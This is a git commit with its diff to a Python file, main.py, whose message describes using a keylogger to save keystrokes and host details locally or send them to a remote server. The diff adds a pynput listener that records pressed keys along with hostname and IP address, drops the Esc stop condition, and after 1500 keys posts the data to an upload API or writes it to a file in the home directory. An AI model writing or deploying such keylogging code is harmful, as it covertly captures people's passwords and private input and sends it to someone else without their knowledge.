31e9a14633e800cb40e3746613b5281c471533c8
HuloM <matthie.l.dubray@gmail.com>
2024-05-09 12:25:28 -0700

    using keylogger to save information about host and keys, either to local machine, or remote server via API

--- main.py
+++ main.py
@@ -1,29 +1,44 @@
 from pynput import keyboard
+import requests, platform, socket, os
+
+
+key_strokes = []
+OPERATING_MODE = 1 # 0: local file save mode, 1: remote API send mode
+FILE_SAVE_LOCATION = os.path.expanduser('~') + '/tmp.log'
+HOSTNAME = socket.gethostname()
+LOCAL_IP_ADDRESS = socket.gethostbyname(HOSTNAME)
+API = f'https://localhost/upload_log'
 
 
 def on_press(key):
     try:
         print('alphanumeric key {0} pressed'.format(
             key.char))
+        key_strokes.append(key.char)
     except AttributeError:
         print('special key {0} pressed'.format(
             key))
 
 
-def on_release(key):
-    print('{0} released'.format(
-        key))
-    if key == keyboard.Key.esc:
-        # Stop listener
-        return False
+def get_json():
+    return {
+        "key_strokes": key_strokes,
+        "hostname": HOSTNAME,
+        "ip_address": LOCAL_IP_ADDRESS,
+    }
 
 
 def main():
     # ...or, in a non-blocking fashion:
     with keyboard.Listener(
-            on_press=on_press,
-            on_release=on_release) as listener:
+            on_press=on_press) as listener:
         listener.join()
+        if len(key_strokes) >= 1500:
+            if OPERATING_MODE == 1:
+                requests.post(API, data=get_json())
+            else:
+                with open(FILE_SAVE_LOCATION, 'w') as f:
+                    f.write('\n'.join(key_strokes))
 
 
 if __name__ == '__main__':
